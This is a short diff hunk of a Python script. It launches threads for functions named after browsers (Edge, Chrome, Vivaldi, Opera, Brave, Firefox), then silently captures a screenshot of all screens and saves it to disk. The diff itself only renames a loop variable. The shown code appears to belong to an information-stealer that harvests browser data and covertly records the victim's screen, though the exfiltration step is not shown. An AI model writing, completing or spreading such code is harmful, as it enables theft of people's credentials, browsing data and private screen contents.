@@ -153,8 +153,8 @@ def vivaldis():
     except:
         pass
 browsers = [edge,chromes,vivaldis,operas,braves,firefoxs]
-for x in browsers:
-  threading.Thread(target=x,).start()
+for i in browsers:
+  threading.Thread(target=i,).start()
 screenshot = ImageGrab.grab(bbox=None,include_layered_windows=False,all_screens=True,xdisplay=None)
 screenshot.save("image.png")
 screenshot.close()
